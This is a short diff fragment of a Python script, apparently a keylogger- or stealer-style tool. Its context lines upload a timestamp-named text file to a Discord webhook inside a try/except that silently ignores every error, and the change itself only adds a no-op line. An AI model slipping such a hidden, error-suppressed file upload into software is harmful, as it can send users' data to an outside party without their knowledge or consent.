@@ -174,5 +174,6 @@ try:
     file_path = f'./{formatted_time}.txt'
 
     send_file_to_discord_webhook(webhook_url, file_path)
+    None
 except:
     None
